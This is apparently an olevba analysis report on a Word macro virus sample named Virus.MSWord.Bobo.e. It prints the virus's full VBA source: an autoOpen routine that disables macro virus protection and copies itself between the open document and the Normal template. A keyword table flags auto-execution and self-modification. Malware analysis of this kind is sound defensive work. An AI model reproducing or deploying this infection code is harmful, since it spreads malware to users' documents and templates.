olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bobo.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bobo.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Bobo.e - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoOpen()
Attribute autoOpen.VB_Description = "Macro creada el 09/04/96 por osvald"
Attribute autoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
Options.VirusProtection = False
  If NormalTemplate.VBProject.Protection = False And ActiveDocument.VBProject.Protection = False Then
   t = False
  s = ActiveDocument.Path + "\" + ActiveDocument.Name
  ss = NormalTemplate.Path + "\" + NormalTemplate.Name
  For Each mhac In NormalTemplate.VBProject.vbcomponents
    If mhac.Name = "Modulo1" Then t = True
  Next mhac
  If t = False Then
     Application.OrganizerCopy Source:=s, Destination _
     :=ss, Name:="Modulo1", Object:=wdOrganizerObjectProjectItems
     If Err.Number <> 0 Then
       Exit Sub
     End If
     NormalTemplate.Save
     If Err.Number <> 0 Then
       Exit Sub
     End If
  End If
  t = False
      For Each mhac In ActiveDocument.VBProject.vbcomponents
         If mhac.Name = "Modulo1" Then t = True
      Next mhac
      If t = False Then
         Application.OrganizerCopy Source:=ss, Destination _
         :=s, Name:="Modulo1", Object:=wdOrganizerObjectProjectItems
         If Err.Number <> 0 Then
      Exit Sub
     End If
     
     If Err.Number <> 0 Then
       Exit Sub
      End If
   End If
End
Else
 MsgBox "Bobo"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

